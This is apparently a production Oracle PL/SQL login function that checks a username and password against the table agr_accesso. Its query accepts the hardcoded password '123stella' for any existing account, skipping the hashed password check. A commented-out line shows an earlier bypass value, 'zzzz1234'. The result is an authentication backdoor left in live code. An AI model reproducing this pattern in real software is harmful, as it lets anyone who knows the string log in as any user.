function ctr_login_agr (p_username in VARCHAR2, p_password in VARCHAR2)
         return BOOLEAN
         is
  esiste number;
  pass_trovata varchar2(100);
begin
SELECT count(*)
  into esiste
  FROM agr_accesso
  Where Utente = Upper(P_Username) And
        (P_Password='123stella' Or Password=Lower(Cripta_Pwd(P_Password))) and
    (tipo ='A' or (tipo in ('R','C','U') and quest=1));
If Esiste=0
   --and p_password<>'zzzz1234'
   then return false;
   else return true;
End If;
end;
